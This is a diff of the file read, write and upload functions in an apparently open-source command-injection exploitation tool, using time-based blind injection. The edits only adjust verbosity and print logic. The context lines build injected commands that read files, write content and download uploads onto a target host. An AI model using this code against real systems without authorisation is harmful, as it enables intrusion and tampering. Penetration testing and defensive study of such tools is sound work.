@@ -33,6 +33,7 @@ The "time-based" injection technique on Blind OS Command Injection.
 Read a file from the target host.
 """
 def file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
+  _ = False
   file_to_read = menu.options.file_read
   # Execute command
   if settings.TARGET_OS == "win":
@@ -43,16 +44,16 @@ def file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
     # The main command injection exploitation.
     check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
     session_handler.store_cmd(url, cmd, output, vuln_parameter)
+    _ = True
     new_line = "\n"
   else:
     output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
-    
   shell = output
   try:
     shell = "".join(str(p) for p in shell)
   except TypeError:
     pass
-  if settings.VERBOSITY_LEVEL >= 1 and menu.options.ignore_session:
+  if settings.VERBOSITY_LEVEL <= 1 and not menu.options.ignore_session and _:
     print ""
   if shell:
     success_msg = "The contents of file '"  
@@ -76,13 +77,13 @@ def file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
 Write to a file on the target host.
 """
 def file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
+  _ = True
   file_to_write = menu.options.file_write
   if not os.path.exists(file_to_write):
     warn_msg = "It seems that the provided local file '" + file_to_write + "', does not exist."
     sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
     sys.stdout.flush()
     raise SystemExit()
-    
   if os.path.isfile(file_to_write):
     with open(file_to_write, 'r') as content_file:
       content = [line.replace("\r\n", "\n").replace("\r", "\n").replace("\n", " ") for line in content_file]
@@ -94,14 +95,12 @@ def file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec,
     warn_msg = "It seems that '" + file_to_write + "' is not a file."
     sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
     sys.stdout.flush()
-    
   if os.path.split(menu.options.file_dest)[1] == "" :
     dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
   elif os.path.split(menu.options.file_dest)[0] == "/":
     dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
   else:
     dest_to_write = menu.options.file_dest
-
   # Execute command
   if settings.TARGET_OS == "win":
     from src.core.injections.results_based.techniques.classic import cb_injector
@@ -137,7 +136,6 @@ def file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec,
     if not menu.options.alter_shell :
       cmd = "'" + cmd + "'"
     dest_to_write = path + "\\" + filname
-
   else:
     cmd = settings.FILE_WRITE + "'" + content + "'" + ">" + "'" + dest_to_write + "'" + separator + settings.FILE_READ + dest_to_write
     check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
@@ -145,7 +143,6 @@ def file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec,
     shell = "".join(str(p) for p in shell)
     # Check if file exists
     cmd = "echo $(ls " + dest_to_write + ")"
-
   print ""
   check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
   shell = output 
@@ -153,8 +150,8 @@ def file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec,
     shell = "".join(str(p) for p in shell)
   except TypeError:
     pass
-  # if settings.VERBOSITY_LEVEL >= 1:
-  #   print ""
+  if settings.VERBOSITY_LEVEL <= 1 and not menu.options.ignore_session and _:
+    print ""
   if shell:
     success_msg = "The '" +  shell + Style.RESET_ALL 
     success_msg += Style.BRIGHT + "' file was created successfully!\n" 
@@ -169,6 +166,7 @@ def file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec,
 Upload a file on the target host.
 """
 def file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
+  _ = True
   if settings.TARGET_OS == "win":
     # Not yet implemented
     pass
@@ -187,7 +185,6 @@ def file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec
       sys.stdout.write(settings.print_critical_msg(err_msg) + "\n")
       sys.stdout.flush()
       raise SystemExit() 
-
     # Check the file-destination
     if os.path.split(menu.options.file_dest)[1] == "" :
       dest_to_upload = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_upload)[1]
@@ -195,13 +192,11 @@ def file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec
       dest_to_upload = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_upload)[1]
     else:
       dest_to_upload = menu.options.file_dest
-      
     # Execute command
     cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
     check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
     shell = output 
     shell = "".join(str(p) for p in shell)
-    
     # Check if file exists!
     if settings.TARGET_OS == "win":
       cmd = "dir " + dest_to_upload + ")"
@@ -214,6 +209,8 @@ def file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec
       shell = "".join(str(p) for p in shell)
     except TypeError:
       pass
+    if settings.VERBOSITY_LEVEL <= 1 and not menu.options.ignore_session and _:
+      print ""
     if shell:
       success_msg = "The '" +  shell + Style.RESET_ALL 
       success_msg += Style.BRIGHT + "' file was uploaded successfully!"
